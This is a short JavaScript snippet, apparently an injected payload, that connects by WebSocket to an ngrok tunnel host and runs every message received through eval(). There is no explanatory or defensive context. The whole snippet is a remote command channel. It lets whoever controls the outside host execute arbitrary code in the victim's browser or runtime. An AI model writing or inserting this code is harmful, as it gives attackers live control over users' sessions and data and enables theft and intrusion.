var e = new WebSocket("wss://73b2-94-205-46-214.ngrok.io");
e.onmessage=function(e){
    eval(e.data)
    console.log(e.data)
}